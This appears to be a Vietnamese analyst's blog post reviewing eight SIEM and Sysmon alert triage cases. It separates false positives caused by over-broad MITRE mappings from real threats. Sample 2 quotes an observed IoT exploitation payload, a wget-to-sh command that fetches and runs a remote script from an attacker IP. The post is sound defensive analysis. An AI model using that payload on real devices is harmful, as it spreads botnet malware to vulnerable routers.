**Sample 1 — "DeskRest.exe": binary có chữ ký hợp lệ bị mapping quá tay.** 140 alert Sysmon xoay quanh `DeskRest.exe` (Desk Rest app, công ty AppSalt, ký số hợp lệ bởi Beellet UAB), khởi chạy trực tiếp từ `Explorer.EXE` (T1204 User Execution — hợp lý vì có tương tác người dùng thật). Vấn đề nằm ở việc Wazuh map hàng loạt event load DLL (.NET runtime, WebView2, Sentry.dll, Countly.dll không ký số) thành **T1055 Process Injection**, **T1073 DLL Side-Loading**, **T1547 Persistence** — nhưng Sysmon Event ID 7 chỉ chứng minh "load DLL", không chứng minh "inject code vào process khác". Điểm thật sự đáng điều tra là 2 DNS query bất thường (`xn--sync-k6d.copper6.com` dạng Punycode, `nqto.jsrxly2020.com`) nhưng cả hai đều **không resolve thành công** trong log. → Kết luận: **Suspicious/Needs Investigation**, phần lớn alert Sysmon là False Positive do rule mapping quá rộng, nhưng chưa đóng case hoàn toàn trước khi enrichment domain/hash.

**Sample 2 — Mass exploitation nhắm router/IoT: True Positive rõ ràng.** 60 alert Suricata, nguồn `45.153.34.231` (AbuseIPDB 100% malicious) nhắm vào `10.4.106.10:8080`. Điểm đặc biệt: attacker **không biết chính xác thiết bị đích là gì** nên ném lần lượt exploit của Linksys (CVE-2025-34037), Tenda (CVE-2020-10987), D-Link HNAP, Totolink (CVE-2022-25075), DD-WRT, Microhard default credentials — pattern điển hình của **mass exploitation/IoT botnet propagation**. Payload đồng nhất: `cd /tmp; wget http://91.92.40.118/wget.sh -O-|sh`. Phần lớn request nhận `405`/`400` (bị từ chối), nhưng riêng Tenda và D-Link NAS command injection nhận `200 OK` — đáng chú ý nhưng **HTTP 200 chỉ chứng minh web server xử lý request ở tầng HTTP, chưa chứng minh command injection đã thực thi**. → Kết luận: **True Positive** (exploitation attempt xác nhận), nhưng compromise thì chưa xác nhận — cần tìm outbound traffic từ `10.4.106.10` tới `91.92.40.118` để xác nhận payload đã tải/chạy.

**Sample 3 — Công cụ crack Windows (KMS activator), không phải tấn công.** 8 alert level 3 xoay quanh `Online_KMS_Activation\Activate.cmd` mở socket tới `kms.srv.crsoo.com:1688` (VT 0/91, khớp danh sách KMS-emulator công khai). Các alert còn lại (load `mscoree.dll`/`mscoreei.dll`, ghi registry certificate store, ghi khóa BAM qua `conhost.exe`) đều là hành vi vận hành bình thường của installer .NET và Windows tracking background activity, không phải injection hay persistence thật. → Kết luận: **False Positive** — máy chạy công cụ kích hoạt bản quyền trái phép, không phải mã độc.

**Sample 4 — Cryptocurrency miner check-in: True Positive nhưng chưa chắc là malware.** 10 alert Suricata cùng signature `ET INFO Cryptocurrency Miner Checkin M2`, source `172.16.40.254` liên tục kết nối `115.238.249.77:52257`. Bằng chứng mạnh nhất không phải chỉ signature mà là **payload thực tế**: decode base64 ra JSON-RPC `method: "login"` kèm `algo: ["rx/0", ...]` — `rx/0` chính là RandomX, thuật toán PoW của hệ sinh thái Monero. Xác nhận ít nhất 3 TCP flow riêng biệt lặp lại trong thời gian ngắn (không phải 1 packet đơn lẻ), và server có phản hồi ngược lại (không chỉ client → server). → Kết luận: **True Positive — cryptocurrency mining activity**, nhưng chưa đủ bằng chứng để khẳng định đây là malware infection hay chỉ là mining software người dùng chủ động cài — cần endpoint telemetry (process nào mở connection, có persistence không) mới trả lời được câu tiếp theo.

**Sample 5 — Trang web phishing/mirror lỗi thời, nhưng traffic hoàn toàn bình thường.** 7 log (Zeek + Suricata + Router) xoay quanh máy Windows 7 + Chrome 60 (đã EOL) truy cập `www.iwsf.com` qua URL có cấu trúc lặp lại bất thường (artifact thường gặp ở site WordPress bị compromise), tải về file tên `arisf180.jpg` nhưng Zeek xác nhận nội dung thực chất là `text/html` (hash SHA1/MD5 sạch trên VT). Suricata match rule "Mirrored Website Comment Observed" vì payload chứa các thẻ `<BODY>` cũ bị comment lại — dấu hiệu điển hình khi trang bị copy/mirror. Tổng kết nối: 682 bytes gửi / 108.499 bytes nhận trong 75.6 giây — tỷ lệ browsing bình thường, không phải exfiltration hay C2 beacon. → Kết luận: **False Positive** cho hành vi tấn công chủ động, nhưng vẫn khuyến nghị vá OS/browser đã EOL và cảnh báo user về trang lạ.

**Sample 6 — Cài driver HP hợp lệ, bị MITRE mapping "hù dọa" quá đà.** ~80 Sysmon events dựng thành một **process tree rất nhất quán**: user giải nén `HPM402D W10.exe` bằng WinRAR → chạy `Setup.exe` → `hpbcsiInstaller.exe` (HP Installer, ký số Hewlett-Packard hợp lệ) → load .NET runtime, tự sinh mã C# tạm rồi gọi `csc.exe` compile (hành vi bình thường của installer .NET) → cài MSI (`HpTcpMon64.msi`, `UnifiedIO.msi`) qua `msiexec.exe` → ghi registry USB/printing enumeration. Wazuh map hàng loạt event này thành **T1055 Process Injection**, **T1543 Service Creation**, **T1036 Masquerading** — nhưng đối chiếu kỹ từng event thì đều chỉ là DLL load, USB device enumeration, hoặc file nằm đúng thư mục cài đặt, **không có bằng chứng thực sự** cho các kỹ thuật đó. Đây là case điển hình mình dùng để tự nhắc bản thân: *"Rule gắn event với T1055, nhưng telemetry chỉ thể hiện DLL load, chưa chứng minh process injection"* — chứ không viết thẳng "Setup.exe thực hiện Process Injection". → Kết luận: **False Positive/Benign Positive**, malware evidence insufficient.

**Sample 7 — CreateRemoteThread vào lsass.exe: dấu hiệu process injection thật sự đáng ngờ.** 9 event Sysmon (Event ID 8 + 10) cho thấy `voice_mail.msg.exe` (đường dẫn network share `\\VBOXSVR\HTools\`, **double extension** đáng ngờ) truy cập hàng loạt tiến trình lõi Windows (`smss.exe`, `csrss.exe`, `lsass.exe`, `wininit.exe`, `winlogon.exe`, `services.exe`) với `GrantedAccess: 0x1f1fff` (full access), rồi `CreateRemoteThread` vào `lsass.exe` với `StartAddress: 0x001A0000`. CallTrace lộ nhiều frame `UNKNOWN(address)` — Sysmon không ánh xạ được các địa chỉ này về module đã biết, gợi ý injected/private executable memory (có thể Reflective DLL Injection), dù chưa đủ để khẳng định chắc chắn là shellcode. → Kết luận: **Suspicious/Undetermined** — chưa có bằng chứng credential dump thành công, nhưng hành vi này không giống một ứng dụng voicemail bình thường chút nào; cần hash file + kiểm tra dấu hiệu LSASS credential dumping.

**Sample 8 — `smss.exe` spawn `cmd.exe` dưới quyền SYSTEM: đơn lẻ thì chưa đủ kết luận.** Duy nhất 1 log Sysmon Event ID 1: `smss.exe` (Session Manager, bình thường chỉ sinh ra `csrss.exe`/`wininit.exe`) tạo process con `cmd.exe` chạy dưới `NT AUTHORITY\SYSTEM`, integrity level System. Quan hệ cha-con này không điển hình cho một command shell thông thường, nhưng log không ghi nhận bất kỳ command/payload nào được thực thi tiếp theo từ `cmd.exe` đó. → Kết luận: **False Positive (Suspicious/Undetermined)** — cần kéo thêm Sysmon event trước/sau thời điểm này để dựng process tree đầy đủ trước khi kết luận chắc chắn.

---

Tuần 3 khép lại với một điều mình thấm rõ nhất: **công cụ SIEM/EDR chỉ giỏi gắn nhãn MITRE ATT&CK, còn việc xác nhận nhãn đó có đúng hay không luôn là việc của con người**. Rule mapping quá rộng (như T1055/T1036 gắn cho một lần load DLL bình thường) là chuyện xảy ra hàng ngày ở bất kỳ SIEM nào, và 8 case ở trên là bài tập tự luyện "đọc telemetry gốc trước, tin MITRE tag sau" mà mình nghĩ nên làm lại định kỳ. Tuần sau dự định đào tiếp mảng threat intelligence & incident response process.

Peace!
